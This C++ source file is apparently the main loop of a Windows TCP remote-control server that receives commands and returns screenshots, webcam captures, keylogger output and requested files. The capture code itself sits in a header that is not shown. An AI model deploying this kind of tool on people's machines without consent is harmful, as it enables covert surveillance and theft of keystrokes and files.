#include "utils.hpp"

int main() {
    WSADATA wsaData;

    SOCKET serverSocket = INVALID_SOCKET;
    SOCKET clientSocket = INVALID_SOCKET;

    addrinfo* result = NULL;
    addrinfo hints;

    // Init socket
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cerr << "\nFailed to initialize sockets. Error: " << WSAGetLastError() << endl;
        return -1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    // Resolve the server address and port
    if (getaddrinfo(NULL, PORT, &hints, &result) != 0) {
        cerr << "\nFailed to resolve the server address and port. Error: " << WSAGetLastError() << endl;
        WSACleanup();
        return -1;
    }

    // Create server socket
    serverSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (serverSocket == INVALID_SOCKET) {
        cerr << "\nFailed to create server socket. Error: " << WSAGetLastError() << endl;
        freeaddrinfo(result);
        WSACleanup();
        return -1;
    }

    // Setup the TCP listening socket
    if (::bind(serverSocket, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
        cerr << "\nFailed to bind. Error: " << WSAGetLastError() << endl;
        freeaddrinfo(result);
        closesocket(serverSocket);
        WSACleanup();
        return -1;
    }

    freeaddrinfo(result);

    // Listen for connection
    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
        cerr << "\nFailed to listen for connection. Error: " << WSAGetLastError() << endl;
        closesocket(serverSocket);
        WSACleanup();
        return -1;
    }
    cout << "\nServer is listening on port " << PORT << "...\n";
        
    char buffer[BUFFER_SIZE]{ 0 };
    string cmd, opt;
    while (cmd != "exit" && cmd != "power") {
        // Accept client connection
        clientSocket = accept(serverSocket, NULL, NULL);
        if (clientSocket == INVALID_SOCKET) {
            cerr << "\nFailed to accept client connection. Error : " << WSAGetLastError() << endl;
            closesocket(serverSocket);
            WSACleanup();
            return -1;
        }
        cout << "\nClient connected!\n";

        // Receive message from client
        recv(clientSocket, buffer, sizeof(buffer), 0);
        cout << "\nReceived from client: " << buffer << endl;

        // Reset state
        opt = "";
        inp.clear();
        
        // Parse message to stringstream for extracting command
        inp.str(buffer);
        inp >> cmd >> opt;

        try {
            // Call corresponding handler
            handlers[cmd][opt]();

            // Send message to client
            string response = out.str();
            out.str("");
            send(clientSocket, response.c_str(), static_cast<int>(response.size()), 0);

            // Send file if needed
            if (opt == "screen") {
                sendFile(clientSocket, screenCapturePath);
            }
            else if (opt == "camera") {
                sendFile(clientSocket, webcamCapturePath);
            }
            else if (cmd == "stop" && opt == "keylogger") {
                sendFile(clientSocket, keyloggerCapturePath);
            }
            else if (opt == "get") {
                sendFile(clientSocket, requestFilePath);
            }
        }
        catch (const exception& e) {
            if (strcmp(e.what(), "bad function call")) {
                out << e.what() << endl;
            }
            else {
                out << "Invalid command!\n\n";
                getInstruction();
            }

            // Send message to client
            string response = out.str();
            out.str("");
            send(clientSocket, response.c_str(), static_cast<int>(response.size()), 0);
        }
        
        // Close client socket
        cout << "\nClient disconnected!\n";
        if (shutdown(clientSocket, SD_SEND) == SOCKET_ERROR) {
            cerr << "Failed to shutdown. Error: " << WSAGetLastError() << endl;
            closesocket(clientSocket);
            closesocket(serverSocket);
            WSACleanup();
            return -1;
        }
        closesocket(clientSocket);
    }

    // Close server socket
    cout << "\nServer stopped!\n";
    closesocket(serverSocket);
    WSACleanup();

    return 0;
}